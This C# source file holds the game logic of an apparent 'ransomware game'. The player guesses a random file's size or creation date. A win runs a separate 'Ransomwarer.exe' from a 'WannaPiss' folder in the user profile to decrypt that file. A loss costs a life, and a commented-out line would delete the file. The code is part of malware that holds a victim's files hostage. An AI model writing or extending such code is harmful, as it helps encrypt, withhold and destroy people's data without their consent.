using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WMPLib;

namespace RansomwareGame
{
    internal static class GameState
    {
        public enum GameMode
        {
            Size = 0,
            DateCreated = 1
        };

        public static int lives = 3;
        public static int score = 0;

        public static float winFactorThreshold = 0.2f;

        public static Metadata currentFile = null;

        public static void nextEvent()
        {
            currentFile = randomFile();
            var mode = randomMode();

            //switch statement that picks either Form3 or Form4 depending on if the mode is Size or DateCreated
            switch (mode)
            {
                case GameMode.Size:
                    var form3 = new Form3();
                    form3.Show();
                    break;
                case GameMode.DateCreated:
                    var form4 = new Form4();
                    form4.Show();
                    break;
            }
        }


        //choose a random file from List<Metadata> and output it to a string variable called randomFile
        public static Metadata randomFile()
        {
            Random rnd = new Random();
            int randomIndex = rnd.Next(0, Metadata.files.Count);
            Metadata randomFile = Metadata.files[randomIndex];
            return randomFile;
        }

        //choose a random number between 0 and 1 and output it to a string variable called randomMode
        public static GameMode randomMode()
        {
            Random rnd = new Random();
            int randomMode = rnd.Next(0, 2);
            var mode = randomMode == 0 ? GameMode.Size : GameMode.DateCreated;
            return mode;
        }

        public static void levelLose()
        {
            if (--lives == 0)
            {
                var form5 = new Form5();
                form5.Show();
            }
            else
            {
                // Delete current file
                var path = currentFile.path;
                // System.IO.File.Delete(path);

                nextEvent();
            }
        }

        public static void levelWin()
        {
            if (++score == 5)
            {
                var form6 = new Form6();
                form6.Show();
            }
            else
            {
                // Decrypt current file
                var path = currentFile.path;
                var userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var exePath = userDirectory + "\\WannaPiss\\Ransomwarer.exe";
                System.Diagnostics.Process.Start(exePath, "d '" + path + "'");

                nextEvent();
            }
        }
    }
}
